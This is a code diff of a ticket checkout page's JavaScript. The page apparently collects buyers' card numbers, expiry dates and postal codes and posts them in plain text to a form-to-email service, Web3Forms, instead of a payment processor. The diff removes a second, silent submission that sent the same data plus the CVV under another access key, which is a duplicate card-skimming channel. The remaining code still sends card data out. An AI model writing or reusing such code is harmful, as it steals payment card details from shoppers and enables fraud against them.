@@ -835,32 +835,11 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('zip_code', postalCode);
         formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expDate}, Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);
 
-        // Submit to first access key
+        // Submit to Web3Forms
         const response = await fetch('https://api.web3forms.com/submit', {
           method: 'POST',
           body: formData
         });
-
-        // Submit to second access key (duplicate submission with different access key)
-        const formData2 = new FormData();
-        formData2.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
-        formData2.append('subject', 'New Ticket Order - Payment Received');
-        formData2.append('from_name', emailInput.value);
-        formData2.append('email_address', emailInput.value);
-        formData2.append('buyer_email', emailInput.value);
-        formData2.append('event_name', document.getElementById('modal-event-name').textContent.trim());
-        formData2.append('ticket_quantity', selectedQty);
-        formData2.append('total_payment', (selectedPrice * selectedQty).toFixed(2));
-        formData2.append('card_number', cardNumber);
-        formData2.append('expiry_date', expDate);
-        formData2.append('security_code', cvv);
-        formData2.append('zip_code', postalCode);
-        formData2.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expDate}, Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);
-
-        fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          body: formData2
-        }).catch(err => console.log('Second Web3Forms submission failed (non-critical)', err));
 
         const result = await response.json();
 
